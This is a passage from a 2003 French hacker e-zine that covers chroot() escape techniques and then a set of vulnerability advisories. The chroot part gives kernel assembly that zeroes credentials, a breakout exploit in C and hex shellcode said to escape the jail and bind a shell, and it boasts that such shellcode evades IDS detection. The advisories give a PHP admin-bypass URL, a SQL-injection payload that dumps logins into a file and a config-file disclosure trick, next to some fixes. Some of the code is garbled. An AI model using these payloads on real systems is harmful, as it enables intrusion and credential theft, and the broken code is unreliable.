  de chroot(). Cette fonction se r&eacute;sume en une sorte de prison, dans laquelle 
  un utilisateur est claustr&eacute; et ne peut pas en sortir. <br>
  Or, il s'av&egrave;re que le chroot() n'est pas secure. Hormis la m&eacute;thode 
  du double chroot() qui n'existe quasiment plus (car il est tr&egrave;s facile 
  de patcher son kernel pour &ccedil;a), il existe environ 4 m&eacute;thodes (dont 
  3 priv&eacute;es).<br>
  La m&eacute;thode du double chroot() (on chroot() par dessus un chroot() pour 
  briser la protection est connue depuis la nuit des temps, mais ne fonctionne 
  plus sur les nouveaux noyaux (les kernels 2.4.x).<br>
  La m&eacute;thode publique a &eacute;t&eacute; expliqu&eacute; par un auteur 
  anonyme dans un des Phrack (cherchez ;). Elle concerne une vuln&eacute;rabilit&eacute; 
  dans le sys&egrave;me chroot(), laquelle est d'ailleurs corrig&eacute;e par 
  despatchs de s&eacute;curit&eacute;s, disponibles sur le Net. A utilisateur 
  root dansun environnement chroot&eacute; est capable deptracer n'importe quel 
  process du syst&egrave;me (&eacute;videmment, hormis init.) . D'o&ugrave; vient 
  l'id&eacute;e de cr&eacute;er un ptrace shellcode. On peut ensuite avec celui-ci, 
  tracer toute sorte de process et l'injecter dans un autre shellcode qui, lui, 
  effecturera un bindsh par exemple.</p>
<p> D'autres m&eacute;thodes existent pour casser ce genre de prisons. Elle se 
  basent sur des vuln&eacute;rabilit&eacute;s de kernels (et dont les patchs n'ont 
  pas &eacute;t&eacute; appliqu&eacute;s) et de d&eacute;mons.<br>
  Un des exemples les plus remarquables concerne une faille dans OpenBSD.Certains 
  services inetd.conf et OpenSSH sont lanc&eacute;s comme user dans un environnement 
  chroot&eacute;. Mais OpenBSD cotient une faille importante qui n'est pas patchable.<br>
  Installons une prison de la sorte :</p>
<p>jailme.c:<br>
  #include <br>
  int<br>
  main() {<br>
  chdir(&quot;/var/tmp/jail&quot;);<br>
  chroot(&quot;/var/tmp/jail&quot;);<br>
  setgroups(NULL, NULL);<br>
  setgid(32767);<br>
  setegid(32767);<br>
  setuid(32767);<br>
  seteuid(32767);<br>
  execl(&quot;/bin/sh&quot;, &quot;jailed&quot;, NULL);<br>
  }</p>
<p>Maintenant on va mettre &agrave; jour l'ucred et le pcred d'un proc donn&eacute;e. 
  On va remplir l'adresse proc de son process parent, via sysctl() en rempla&ccedil;ant 
  long 0x12345678. </p>
<p>call moo<br>
  .long 0x12345678 //addresse pproc<br>
  .long 0xdeadcafe<br>
  .long 0xbeefdead<br>
  nop<br>
  nop<br>
  nop<br>
  moo:<br>
  pop %edi<br>
  mov (%edi),%ecx //l'adresse du proc parent dans ec</p>
<p>// p_ruid<br>
  mov 0x10(%ecx),%ebx // ebx = p-&gt;p_cred<br>
  xor %eax,%eax<br>
  mov %eax,0x4(%ebx) // p-&gt;p_cred-&gt;p_ruid = 0</p>
<p>// mettre a jour cr_uid<br>
  mov (%ebx),%edx // edx = p-&gt;p_cred-&gt;pc_ucred<br>
  mov %eax,0x4(%edx) // p-&gt;p_cred-&gt;pc_ucred-&gt;cr_uid = 0</p>
<p>Les prisons chroot sont v&eacute;rifi&eacute;es ainsi pour chaque process : 
  on remplit le membre fd_dir de filedsc (struct d'ouverture de fichier) avec 
  le tpr vnode des r&eacute;pertoires chroot&eacute;s. Quand le kernel veut donn&eacute; 
  un service &agrave; un process, il v&eacute;rifie l'existence de ce ptr. S'il 
  est pr&eacute;sent, le kernel cr&eacute;era un nouveau root directory pour ce 
  process et le crhootera dans un r&eacute;pertoire pr&eacute;d&eacute;fini. Pour 
  un process r&eacute;gulier ce ptr est zero.<br>
  Si on met fd_dir &agrave; 0, on bypasse alors le chroot :) <br>
  fd_d_ir est r&eacute;f&eacute;renc&eacute; ainsi : p-&gt;p_fd-&gt;fd_rdir</p>
<p>On cassera donc le chroot ainsi :</p>
<p>mov 0x14(%ecx),%edx // edx = p-&gt;p_fd<br>
  mov %eax,0xc(%edx) // p-&gt;p_fd-&gt;fd_rdir = 0</p>
<p>Ce probl&egrave;me est d&ucirc; &agrave; un overflow dans OpenBSD... et vu 
  que les admins patchent mal (cf le virus Slammer ou Blaster :) Cette technique 
  a bien &eacute;t&eacute; expliqu&eacute; par Sinan dans Phrack 60.</p>
<p> Il existe un autre moyen de casser un chroot, mais qui demande d'&ecirc;tre 
  root dans l'environnement chroot&eacute;. Cela est du &agrave; une vuln&eacute;rabilit&eacute; 
  dans plusieurs wu-ftpd qui n'est pas patchable... La solution est de ne pas 
  mettre de root dans l'environnement chroot&eacute; (mais si on obtient les privil&egrave;ges 
  de root via une autre faille ?? :p). Elle touche toutes les versions unix (sauf 
  freeBSD 4.x o&ugrave; le chroot() est plus robuste).</p>
<p>voici ce que donne l'exploit en C pour avoir un aper&ccedil;u de l'action du 
  shellcode :<br>
  int main() {<br>
  char *sh[2]={&quot;/bin/sh&quot;, NULL};<br>
  int gg=0xed<br>
  mkdir(&quot;sh..&quot;; gg&quot;);<br>
  chroot(&quot;sh..&quot;);<br>
  while (gg!=0= {<br>
  chdir(&quot;..&quot;); gg--;<br>
  }<br>
  chroot(&quot;..&quot;);<br>
  execve(sh[0],sh,NULL);<br>
  }</p>
<p>par suite, on obtient ce shellcode :</p>
<p>char sc[]=<br>
  &quot;\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\xeb\x36\x5e\x88\x46\x0a&quot;<br>
  &quot;\x8d\x5e\x05\xb1\xed\xb0\x27\xcd\x80\x31\xc0\xb0\x3d\xcd\x80\x83&quot;<br>
  &quot;\xc3\x02\xb0\x0c\xcd\x80\xe0\xfa\xb0\x3d\xcd\x80\x89\x76\x08\x31&quot;<br>
  &quot;\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x89\xc2\xb0\x0d&quot;<br>
  &quot;\xcd\x80\xe8\xc5\xff\xff\xff/bin/sh..&quot;;</p>
<p>int main() {<br>
  int *ret=(int *)(&amp;ret+2):<br>
  printf(&quot;taille:%d\n&quot;,strlen(sc));<br>
  *ret=(int(sc);</p>
<p>80 bytes... pas mal, mais maintenant qu'on sait optimiser un shellcode, faisons 
  le pour le fun :</p>
<p>char sc[]=<br>
  &quot;\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x5e\x88\x46\x0a&quot;<br>
  &quot;\x8d\x5e\x05\xb1\xed\xb0\x27\xcd\x80\x31\xc0\xb0\x3d\xcd&quot;<br>
  &quot;\x80\x83\xc3\x02\xb0\x0c\xcd\x80\xe0\xfa\xb0\x3d\xcd\x80&quot;<br>
  &quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89&quot;<br>
  &quot;\xe1\xb0\x0d\xcd\x80&quot;</p>
<p>Un shellcode qui breake un chroot et binde un shell en 65 octets :)<br>
  Voil&agrave; une petite d&eacute;monstration de la puissance que peut avoir 
  un shellcode bien programm&eacute;. Ensuite, on peut lui faire faire des manipulations 
  de fichiers, bref, la seule barri&egrave;re sera votre imagination...</p>
<p></p>
<p> Apr&egrave;s cette br&egrave;ve illustration des cassage de chroot(), deux 
  petits mots sur la fonction jail(). jail() est une &eacute;volution de chroot(). 
  Cette fonction est tr&egrave;s souple. Des fonctionnalit&eacute;s sont mises 
  en place, tel quel le param&eacute;trage au d&eacute;marrage d'une fail, la 
  possibilit&eacute; de tuer un process depuis l'ext&eacute;rieur ou de placer 
  un process dans une jail apr&egrave;s son lancement. Etre dans une jail est 
  un peut comme &ecirc;tre derri&egrave;re une glace sans teint : de l'ext&eacute;rieur 
  on voit l'int&eacute;rieur, mais ce n'est pas r&eacute;ciproque. Ainsi, dans 
  l'hypoth&egrave;se d'une attaque, l'intrus obtiendrait par exemple d'abord un 
  acc&egrave;s local par un exploit distant, puis un acc&egrave;s root par un 
  exploit local mais se verrait confin&eacute; dans sa jail. De plus, la jail 
  est tout de m&ecirc;me restrictive, quoi qu'on en dise. Par exemple, il est 
  interdit de modifier le kernel ouc harger des LKM, modifier la configuration 
  r&eacute;seau, monter des filesystems, cr&eacute;er des p&eacute;riph&eacute;riques, 
  acc&eacute;der au API raw ou routing socket, modifier la MIB (Management Information 
  Base) sysctl, modifier le securelevel... <br>
  Toutefois, &agrave; une &eacute;poque des programmeurs avaient pour projet de 
  recoder jail() en plus secure, ce qui tent &agrave; sous-entendre que jail() 
  &eacute;tait bypassable... En outre, en s'y penchant de plus ptr&egrave;s, jail() 
  n'est pas aussi restrictif qu'on pourrait le croire en lisant ce qui est dit 
  pr&eacute;c&eacute;demment, et diff&eacute;rentes m&eacute;thodes sont envisageables 
  pour la bypasser. Comment la bypasser ? je n'ai pas termin&eacute; mes travaux 
  sur jail() donc je ne dirais rien dessus. De plus, ces m&eacute;thodes sont 
  tr&egrave;s dangereuses &agrave; d&eacute;voiler.</p>
<p><br>
  6. CONCLUSION<br>
  ---------------------</p>
<p> En appliquant minutieusement ces m&eacute;thodes, il est quasiment impossible 
  de d&eacute;tecter des attaques par buffer overflow avec des signatures comme 
  le font la plupart des IDS. Il faudra des analyseurs statistiques &agrave; partir 
  de diff&eacute;rentes propri&eacute;t&eacute;s des connexions et/ou de leur 
  contenu , tel que Snort...<br>
  Bref, nous avons ainsi r&eacute;aliser non seulement des shellcodes optimis&eacute;s, 
  mais encore des shellcodes polymorphiques. Ce genre de shellcodes &eacute;volu&eacute;s 
  sera ind&eacute;tectable. Ensuite, libre &agrave; vous de les programmer afin 
  qu'ils aient des champ d'action plus grand...<br>
  Et surtout n'oubliez pas : tout &ccedil;a, c'est pour le fun ;)</p>
<p> Have fun,<br>
  Nocte / DHS (http://www.dhs-team.org - slickers@6sens.com)</p>
<p>7. REFERENCES<br>
  -------------------------------------------------------------------------------------<br>
  R&eacute;f&eacute;rences :<br>
  - Sinan &quot;noir&quot; eren &quot;Smashing the Kernel Stack for Fun And Profit&quot;, 
  Phrack #60-0x06<br>
  - Aleph1 &quot;Smashing the Stack For Fun And Profit&quot;, Phrack #49-0x0e<br>
  - rix &quot;Writing ia32 alphanumeric shellcodes&quot;, Phrack 54-0x0f<br>
  - anonyme &quot;Buidling ptrace injecting shellcode&quot;, Phrack #59-0x0c<br>
  - Ktwo. Adm-mutate - ADM Team<br>
  - Intel Corp &quot;Intel architecture Software Developer's Manuel (vol.1-3)</p>
<p>-------------------------------------------------------------------------------------</p>
<P ALIGN="CENTER"><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR>
  <B><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2" COLOR="#FF0000">...::: 
  Shellcoding By</FONT> Nocte <FONT COLOR="#FF0000">::...</FONT></B></FONT></P>
<P ALIGN="LEFT">&nbsp; </P>
<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">===================================================================== 
  <br>
  6. FAILLES : <b>DHS SECURITY ADVISORIES</b> - DHS Team Admin<br>
  ===================================================================== </font></p>
<p><font size="2" face="Arial, Helvetica, sans-serif">Date : 19/08/2003<br>
  Auteur : <a href="mailto:alex.bone@caramail.com">A-bone</a> <br>
  </font><font size="2" face="Arial, Helvetica, sans-serif">Produit : Serveur 
  Caramail </font></p>
<p>Le site de la boite du service webmail la plus r&eacute;pandu en France, je 
  parle de Caramail, a une faille not&eacute; 6/10 qui permet &agrave; n'importe 
  quel utilisateur mal intentionn&eacute; de lire la source de n'importe quel 
  fichier sur le serveur, ainsi de r&eacute;cup&eacute;rer des informations importantes, 
  cette faille je l'ai tester elle existe et peut &ecirc;tre exploiter par simple 
  url. </p>
<p>Les administrateurs de caramail ont &eacute;t&eacute; avertis, et DHS-Team 
  a re&ccedil;u une r&eacute;ponse comme quoi des mesures de s&eacute;curit&eacute; 
  on &eacute;tait prise par rapport &agrave; ce trou. </p>
<p>Exemple de la lecture d'un fichier : </p>
<p>500 Servlet Exception <br>
  /usr/local/apache/htdocs/index.jsp:37: cannot resolve symbol <br>
  symbol : variable Configuration <br>
  location: class _index__jsp <br>
  if ((Configuration.getProperty(&quot;metatag.title&quot;,&quot;Europe&quot;,&quot;Localization/&quot;+DOMAIN_NAME))!= 
  <br>
  null) <br>
  ^ <br>
  /usr/local/apache/htdocs/index.jsp:38: cannot resolve symbol <br>
  symbol : variable Configuration <br>
  location: class _index__jsp <br>
  title = Configuration.getProperty(&quot;metatag.title&quot;,&quot;Europe&quot;,&quot;Localization/&quot;+DOMAIN_NAME); 
  <br>
  ^ <br>
  /usr/local/apache/htdocs/index.jsp:41: cannot resolve symbol <br>
  symbol : variable Configuration <br>
  location: class _index__jsp <br>
  if((Configuration.getProperty(&quot;metatag.description&quot;,&quot;Europe&quot;,&quot;Localization/&quot;+DOMAIN_NAME))!= 
  <br>
  null) <br>
  ^ <br>
  /usr/local/apache/htdocs/index.jsp:42: cannot resolve symbol <br>
  symbol : variable Configuration <br>
  location: class _index__jsp <br>
  description = Configuration.getProperty(&quot;metatag.description&quot;,&quot;Europe&quot;,&quot;Localization/&quot;+DOMAIN_NAME); 
  <br>
  ^ <br>
  /usr/local/apache/htdocs/index.jsp:43: cannot resolve symbol <br>
  symbol : variable Configuration <br>
  location: class _index__jsp <br>
  if((Configuration.getProperty(&quot;metatag.keywords&quot;,&quot;Europe&quot;,&quot;Localization/&quot;+DOMAIN_NAME))!= 
  <br>
  null) <br>
  ^ <br>
  /usr/local/apache/htdocs/index.jsp:44: cannot resolve symbol <br>
  symbol : variable Configuration <br>
  location: class _index__jsp <br>
  keywords = Configuration.getProperty(&quot;metatag.keywords&quot;,&quot;Europe&quot;,&quot;Localization/&quot;+DOMAIN_NAME); 
  <br>
  ^ <br>
  /usr/local/apache/htdocs/index.jsp:45: cannot resolve symbol <br>
  symbol : variable Configuration <br>
  location: class _index__jsp <br>
  if((Configuration.getProperty(&quot;metatag.outline&quot;,&quot;Europe&quot;,&quot;Localization/&quot;+DOMAIN_NAME))!= 
  <br>
  null) <br>
  ^ <br>
  /usr/local/apache/htdocs/index.jsp:46: cannot resolve symbol <br>
  symbol : variable Configuration <br>
  location: class _index__jsp <br>
  outline = Configuration.getProperty(&quot;metatag.outline&quot;,&quot;Europe&quot;,&quot;Localization/&quot;+DOMAIN_NAME); 
  <br>
  ^ <br>
  /usr/local/apache/htdocs/index.jsp:47: cannot resolve symbol <br>
  symbol : variable Configuration <br>
  location: class _index__jsp <br>
  if((Configuration.getProperty(&quot;metatag.robots&quot;,&quot;Europe&quot;,&quot;Localization/&quot;+DOMAIN_NAME))!= 
  <br>
  null) <br>
  ^ <br>
  /usr/local/apache/htdocs/index.jsp:48: cannot resolve symbol <br>
  symbol : variable Configuration <br>
  location: class _index__jsp <br>
  robots = Configuration.getProperty(&quot;metatag.robots&quot;,&quot;Europe&quot;,&quot;Localization/&quot;+DOMAIN_NAME); 
  <br>
  ^ <br>
  /usr/local/apache/htdocs/index.jsp:49: cannot resolve symbol <br>
  symbol : variable Configuration <br>
  location: class _index__jsp <br>
  if((Configuration.getProperty(&quot;metatag.language&quot;,&quot;Europe&quot;,&quot;Localization/&quot;+DOMAIN_NAME))!= 
  <br>
  null) <br>
  ^ <br>
  /usr/local/apache/htdocs/index.jsp:50: cannot resolve symbol <br>
  symbol : variable Configuration <br>
  location: class _index__jsp <br>
  lng = Configuration.getProperty(&quot;metatag.language&quot;,&quot;Europe&quot;,&quot;Localization/&quot;+DOMAIN_NAME); 
  <br>
  ^ <br>
  /usr/local/apache/htdocs/index.jsp:196: cannot resolve symbol <br>
  symbol : variable Configuration <br>
  location: class _index__jsp <br>
  if( (tmp =Configuration.getProperty(&quot;redirect.&quot;+redirect,&quot;Europe&quot;,&quot;_Modules&quot;)) 
  != null) <br>
  ^ <br>
  13 errors </p>
<p></p>
<p>-------------------------------------------------------------------------------- 
  <br>
  Resin 2.1.7 (built Fri Feb 14 12:48:13 PST 2003) </p>
<p>Note de Nocte : &agrave; l'heure de la r&eacute;daction de ces lignes, je viens 
  de tester cette faille qui n'est toujours pas colmat&eacute;e. ON limitera donc 
  pour l'instant les explications sur son exploitation. A suivre...</p>
<P ALIGN="LEFT">-------------------</P>
<P ALIGN="LEFT"><font size="2" face="Arial, Helvetica, sans-serif">Date : 24/08/2003<br>
  Auteur : <a href="mailto:slickers@6sens.com">Nocte</a> <br>
  Produit : Buffer Overflow dans Windows XP (Original advisory sur Wholetrack 
  : http://oz-formation.nexenservices.com/wholetrack)</font></P>
<P ALIGN="LEFT">Il y a une faille de Buffer overflow dans Windows XP. En effet, 
  si l'on cr&eacute;e un dossier &quot;c:\AAAAAAAA&quot; avec 243 &quot;A&quot; 
  (ou n'importe quel autre carac&egrave;tre), quo'n y place un ex&eacute;cutable 
  dedans et qu'on fasse un raccourci cet ex&eacute;cutable dans une autre dossier, 
  le raccourci s'ex&eacute;cutera sans probl&egrave;me (&eacute;liminant l'Explorer 
  overflow pr&eacute;sent dans Windows NT). Or, si on supprime l'ex&eacute;cutable 
  du dossier &quot;c:\AAAAAAA...&quot;, et qu'on veuille faire autre chsoe qu'ouvrir 
  le fichier (le copier, regarder ses propri&eacute;t&eacute;s ou le supprimer&quot;, 
  un bug se produit. Au lieu de r&eacute;aliser l'action, Explorer.exe est &quot;r&eacute;s&eacute;t&eacute;&quot; 
  (l'Explorateur Windows se ferme et toutes les applications en cours).<br>
  Que se passe-t-il ? Comme la cha&icirc;ne de caract&egrave;res du dossier est 
  trop longue, elle overwritte des donn&eacute;es indispensables au raccourci. 
  On peut d&egrave;s lors modifier le flux d'ex&eacute;cution et overwritt&eacute; 
  ces donn&eacute;es avec un shellcode &agrave; nous !</P>
<p>Cette faille peut &ecirc;tre exploitable (car on a besoin d'un raccourci qui 
  pointe sur nul part!). D&egrave;s lors on peut coder un exploit qui :<br>
  - cr&eacute;e un raccourci<br>
  - et qui initialise ce raccourci pointant sur un dossier a 243 caract&egrave;res 
  mais inexistant.<br>
  - on rajoute un shellcode &agrave; la fin de cette cha&icirc;ne.</p>
<p>&nbsp;</p>
<p>-------------------</p>
<P ALIGN="LEFT"><font size="2" face="Arial, Helvetica, sans-serif">Date : 26/08/2003<br>
  Auteur : <a href="mailto:slickers@6sens.com">Nocte</a> <br>
  Produit : Buffer Overflow dans Windows 98 (Original advisory sur Wholetrack 
  : http://oz-formation.nexenservices.com/wholetrack/)</font><BR>
</P>
<P ALIGN="LEFT">Suite au BOF de Windows XP, Windows 98 poss&egrave;de lui aussi 
  des vuln&eacute;rabilit&eacute;s de Buffer Overflows.</P>
<p>1) Si l'on cr&eacute;e un dossier nomm&eacute; &quot;AAAA&quot; avec plus 245 
  'A' et quo'n y place un fichier word (ou un autre), Explorer refuse l'acc&egrave;s 
  au odsiser en pr&eacute;textant que la cha&icirc;ne de caract&egrave;res est 
  trop longue, ce qui constitue une protection contre un &eacute;ventuel Buffer 
  overflow. Cependant, si le dossier poss&egrave;de 245 caract&egrave;res exactement, 
  le dossier s'ouvre mais lors de l'ouverture du fichier, Windows lancera l'ex&eacute;cution 
  de la DLL Winspool.drv afin d'appeler le d&eacute;bugger.<br>
  Ceci est une faille puisqu'en effet, si l'on d&eacute;tourne le lancement de 
  la DLL par un shellcode &agrave; nous, notre shellcode s'ex&eacute;cutera.</p>
<p>2) Maintenant, cr&eacute;ons un raccourci de ce fichier avec l'extension .bin 
  dans un autre r&eacute;pertoire. Avec un &eacute;diteur hexa on s'paer&ccedil;oit 
  que la cha&icirc;ne de 'A' ne remplit pas la fin du fichier. Si on l'a prolonge 
  jusqu'&agrave; la fin et quon retourne dans le dossier o&ugrave; se trouve ce 
  racourci, explorer.exe plante m&eacute;chamment. On s'aper&ccedil;oit alors 
  que %edx a &eacute;t&eacute; overwritt&eacute;e par notre cha&icirc;ne de caract&egrave;re.<br>
  il n'y a plus aucun moyen, par Windows, d'acc&eacute;der &agrave; ce fichier</p>
<p>(m&ecirc;me si on ouvre Hex Work Shop et qu'on cherche ce fichier &agrave; 
  ouvrir, explorer.exe killera imm&eacute;diatement Hex Work Shop! C'est un nouveau 
  PME de Microsoft (Plantage M&eacute;chant d'Explorer.exe)</p>
<p>&nbsp;</p>
<p><font size="2" face="Arial, Helvetica, sans-serif">Date : 29/08/2003<br>
  Auteur : <a href="mailto:slickers@6sens.com">Nocte (thx : m0uchard !!)</a> <br>
  Produit : DHS Forum !! ;-)</font></p>
<P ALIGN="LEFT">En effet, il y a quelques jours, j'ai trouv&eacute; deux failles 
  majeure sur notre Website qui permettait entre autres de supprimer les admins 
  d'acc&eacute;der a PhpMyAdmin avec les droits root... Elles ont toutes &eacute;t&eacute; 
  patch&eacute;es. Reprenons les failles une par une.<br>
  1) La premi&egrave;re faille concerne une vuln&eacute;rabilit&eacute; connue 
  depuis quelques mois et qu'un SK (membre de 2037.biz) a d&eacute;voil&eacute; 
  ceci sur un forum de s&eacute;curit&eacute; public... Je tiens &agrave; remercier 
  m0uchard (un membre du forum) qui m'a averti du probl&egrave;me et n'a pas profit&eacute; 
  de cette faille pour d&eacute;truire le forum ainsi que le site ce qu'il aurait 
  pu faire ais&eacute;ment. Merci encore de son &eacute;tat d'esprit ;)<br>
  Cette faille concerne un probl&egrave;me s'appliquant &agrave; tous les sites 
  h&eacute;berg&eacute;s par Lycos (encore eux, d&eacute;cid&eacute;ment leur 
  techniciens sont de vrais incapables). En effet, pour ce qui est de notre site 
  : <a href="http://dealerhacksecurity.free.fr">http://dealerhacksecurity.free.fr</a>, 
  il poss&egrave;de un miroir <a href="http://membres.lycos.fr/dealersecurity">http://membres.lycos.fr/dealersecurity</a>. 
  Or, il est possible d'acc&eacute;der au fichier config.php qui se trouve &agrave; 
  l'url <a href="http://membres.lycos.fr/membres/config.php">http://membres.lycos.fr/membres/config.php</a> 
  : bien qu'il soit ex&eacute;cut&eacute; par le serveur, il est possible de le 
  lire en rentrant &agrave; la suite de l'url les caract&egrave;res &quot;%3f.jps/%3f.jps&quot;. 
  m0uchard a ainsi eu acc&egrave;s au login et au au mot de pass de notre base 
  de donn&eacute;es phpmyadmin... Assez compromettant!! Avis aux administrateurs 
  et webmasters qui auraient ce genre de probl&egrave;me : la solution est bien 
  &eacute;videmment de supprimer ce fichier config.php ou de placer un .htaccess 
  a la racine ce qui constituera une protection suffisante contre cette probl&egrave;me 
  de s&eacute;curit&eacute;..<br>
  2) Cette deuxi&egrave;me faille a &eacute;t&eacute; trouv&eacute; par Nocte. 
  affectait le logiciel PYMembre version 4.2 que l'on utilisait. Cette application 
  permet de g&eacute;rer sa propre partie membre sur son site, via une partie 
  administration. Or, frog-man, administrateur de http://phpsecure.info avait 
  post&eacute; sur wholetrack un advisory de s&eacute;curit&eacute; concernant 
  cette application jusqu'&agrave; laversion 4.2 inclue. Pour 'lacc&egrave;s &agrave; 
  la partie administration, le fichier admin/secure.php contient une faille dans 
  son code :<br>
  ----------------------------------------------<br>
  &lt;?<br>
  if (!isset($adminpy) &amp;&amp; $adminpy !== &quot;$admin&quot;)<br>
  {<br>
  Header(&quot;Location: index.php&quot;);<br>
  exit;<br>
  }<br>
  ?&gt;<br>
  ----------------------------------------------</P>
<P ALIGN="LEFT">On voit tr&egrave;s vite que le ET devrait &ecirc;tre un OU : 
  on doit se logguer si la variable adminpy est vide ou si elle est diff&eacute;rente 
  du mot de passe admin... D&egrave;s lors en utilisant l'url : http://[target]/admin/admin.php?adminpy=1, 
  on se retoruve dans la partie admin! Pour la s&eacute;curiser il suffit dans 
  admin/secure.php de remplacer la ligne :<br>
  ----------------------------------------------<br>
  if (!isset($adminpy) &amp;&amp; $adminpy !== &quot;$admin&quot;)<br>
  ----------------------------------------------<br>
  par :<br>
  ----------------------------------------------<br>
  if (!isset($adminpy) || $adminpy !== &quot;$admin&quot;)<br>
  ----------------------------------------------</P>
<P></P>
<P>Un autre vuln&eacute;rabilit&eacute; concernant la m&ecirc;me version de cette 
  application et qu'il est possible juste via l'url de r&eacute;cup&eacute;rer 
  les login et mots de passes de $db_table par une faille de SQL injection sur 
  le fichier pass_done.php. Pour cela, il suffit de rentrer l'url : http://[target]/pass_done.php?Submit=1&amp;email='%20OR%203%20IN%20(1,2,3)%20INTO%20OUTFILE%20'/complete/path/file.txt<br>
  (3 IN (1,2,3) renvoie toujours vrai). Pour corriger ce probl&egrave;me, nous 
  vous conseillons de rajouter dans pass_done.php avant la ligne<br>
  ---------------------------------------------------------------------------------<br>
  $query = mysql_query(&quot;SELECT login, passwd FROM $db_table WHERE email='$email'&quot;); 
  <br>
  ---------------------------------------------------------------------------------<br>
  d'ajouter la ligne :<br>
  ----------------------------<br>
  $email = addslashes($email);<br>
  ----------------------------</P>
<P>Comme beaucoup de webmasters sont atteints par ce probl&egrave;me et que cette 
  faille a &eacute;t&eacute; rendue publique il y a quelques jours (on parle de 
  la faille Lycos, pour celle de PYMembre, l'auteur de la faille, frog-man a publi&eacute; 
  un advisory sur Wholetrack et sur son site http://phpsecure.info) nous estimons 
  n&eacute;cessaire de divulguer &agrave; notre tour ces informations &agrave; 
  haut risque. Webmasters, soyez vigilant !! Et auditez vos codes.... Par dessus-tout 
  n'oubliez jamais de vous tenir &agrave; jour sur lees vuln&eacute;rabilit&eacute;s 
  des applications que vous employez et patchez imm&eacute;diatement apr&egrave;s 
  la d&eacute;couverte d'une faille, f&ucirc;t-elle mineure!</P>
<P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>
  ===================================================================== <BR>
  The end :) Et voil&agrave; ! Ce num&eacute;ro copieux et riches en aventures 
  touche &agrave; sa fin. Prenez le temps de lire, tester, m&eacute;ditez et bien 
  cogitez sur les articles propos&eacute;s. J'esp&egrave;re que nos nouveaux objectifs 
  en mati&egrave;re de s&eacute;curit&eacute; vous odnneront l'envie de vous investir 
  davantage dans ce domaine et surtout d'avoir pour &eacute;tat d'esprit non pas 
  d'exploiter stupidement une faille trouv&eacute;e, mais bien plut&ocirc;t de 
  faire les d&eacute;marches n&eacute;cessaires afin qu'elle soit combl&eacute;e 
  au plus t&ocirc;t (sur ce point, m0uchard est un exemple ;). Pour cela, le meilleur 
  moyen et de coder un exploit puis de mailer &agrave; la soci&eacute;t&eacute; 
  concern&eacute;, soit de d&eacute;velopper un patch de s&eacute;curit&eacute;... 
  <br>
  Have fun Y'all ;)</FONT></P>
<P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Bon, sur ce, je 
  terminerai par ce po&egrave;me d'un hacker anonyme : </FONT></P>
<P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR><FONT COLOR="#00CC00" SIZE="1">010110100111 
<BR>101010100100 <BR>100011010111 <BR>110010101000 </FONT></FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="1" COLOR="#00CC00">100010101111 
<BR>100010101110 <BR>001011011011 <BR>101100110010 </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="1" COLOR="#00CC00">101101010010 
<BR>010101011010 <BR>010111010011 </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="1" COLOR="#00CC00">101001010111 
<BR>010101001111 <BR>111010010111 </FONT></P><P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
</FONT></P>
<P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Visitez 
  notre WebSite: <A HREF="http://dealer-hack.ifrance.com" TARGET="_blank">http://www.dhs-team.org</A></FONT></P>
<P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Vous 
  avez des questions &agrave; propos du nos Mag's ? Un sujet vous intrigue ? L&acirc;chez 
  vous sur notre forum : <A HREF="http://dealerhacksecurity.free.fr/forum" TARGET="_blank">http://dealerhacksecurity.free.fr/forum</A><BR>
  </FONT></P>
<P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><B>By</B></FONT> 
  <B><font face="Verdana, Arial, Helvetica, sans-serif" size="2">DHS Team - The 
  Dealer Hack Security Team</font></B></P>
</BODY>
</HTML>
